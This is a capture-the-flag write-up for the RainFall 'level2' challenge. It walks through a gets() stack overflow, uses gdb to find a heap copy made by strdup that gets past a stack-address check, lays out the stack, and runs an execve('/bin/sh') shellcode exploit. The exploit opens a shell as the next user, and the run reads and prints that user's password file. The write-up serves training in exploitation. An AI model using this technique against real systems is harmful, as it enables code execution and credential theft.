## level2

We are once again face to face with a `gets` vulnerability.

```c
void p() {
    char buf[64];
    unsigned int ret_addr;

    fflush(stdout);
    gets(buf);

    ret_addr = (unsigned int)__builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", (const void*)ret_addr);
        _exit(1);
    }

    puts(buf);
    strdup(buf);
}

int main() { p(); }
```

The previous level provided us with a helper function running a shell, but we have no such luck this time.

We can write custom machine code to a buffer then jump to this buffer to execute it. This code is usually just a call to `execve("/bin/sh", 0, 0)`. Thus the name: **shellcode**.

A shellcode exploit has this structure:
- actual shellcode
- padding to align the address we'll write to the saved return address
- address of the start of the shellcode

This level makes it a bit harder by checking if the address is in the range `0xb0000000` -> `0xffffffff`, which contains the stack. Luckily the buffer is duplicated on the heap with `strdup` right after.

```nasm
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
[...]
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) run
Starting program: /home/user/level2/level2 
lol
lol

Breakpoint 1, 0x0804853d in p ()
(gdb) info reg eax
eax            0x804a008        134520840
```

The address of our shellcode will be 0x804a008, a value on the heap, which avoids the stack check.

```
[ebp-0x4c] ... [ebp-0x0d] → buf[64]
[ebp-0x0c]                → ret_addr (4 bytes)
[ebp-0x08] ... [ebp-0x04] → alignment, unused (8 bytes)
[ebp+0x00]                → saved EBP (4 bytes)
[ebp+0x04]                → real return address
```

The script [level2.py](./resources/level2.py) prints the full exploit.

```console
level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2 
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```